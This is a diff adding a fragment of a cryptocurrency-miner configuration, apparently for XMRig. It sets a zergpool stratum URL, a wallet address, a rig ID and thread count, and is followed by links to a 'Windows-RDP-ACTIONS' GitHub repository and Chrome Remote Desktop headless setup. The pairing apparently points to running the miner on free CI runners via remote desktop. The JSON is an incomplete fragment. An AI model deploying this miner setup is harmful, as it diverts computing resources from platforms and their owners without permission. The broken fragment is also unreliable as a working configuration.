@@ -1,0 +1,36 @@
+"algo": "cryptonight-upx/2",
+
+            "coin": null,
+
+            "url": "stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457",
+
+            "user": "MDPerMCvJJuRNyDZJQ3Z2R76zkgyQD5ayG",
+
+            "pass": "x",
+            "rig-id": "c=LTC,ID=batu1",
+
+            "nicehash": false,
+
+            "keepalive": true,
+
+            "enabled": true,
+
+            "tls": true,
+
+            "tls-fingerprint": null,
+
+            "daemon": false,
+
+            "socks5": null,
+
+            "self-select": null,
+
+	    "threads": "4",
+
+            "submit-to-origin": false
+
+
+
+ https://github.com/CI-Devs/Windows-RDP-ACTIONS
+
+ https://remotedesktop.google.com/headless
